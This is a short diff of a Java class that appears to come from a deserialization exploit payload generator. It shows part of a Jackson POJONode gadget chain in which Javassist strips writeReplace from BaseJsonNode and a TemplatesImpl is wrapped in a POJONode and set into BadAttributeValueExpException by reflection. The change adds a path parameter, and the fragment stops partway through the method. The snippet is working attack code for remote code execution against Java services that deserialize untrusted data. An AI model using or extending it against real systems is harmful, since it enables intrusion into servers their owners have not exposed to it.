@@ -12,14 +12,14 @@ import javax.management.BadAttributeValueExpException;
 import java.lang.reflect.Field;
 
 public class Jackson implements Gadget {
-    public Object getObject(String common) throws Exception {
+    public Object getObject(String common, String path) throws Exception {
         ClassPool pool = ClassPool.getDefault();
         CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
         CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
         ctClass0.removeMethod(writeReplace);
         ctClass0.toClass();
 
-        TemplatesImpl template = TemplateUtils.getTemplate(common);
+        TemplatesImpl template = TemplateUtils.getTemplate(common, path);
         POJONode node = new POJONode(template);
         BadAttributeValueExpException val = new BadAttributeValueExpException(null);
         //反射设置val属性
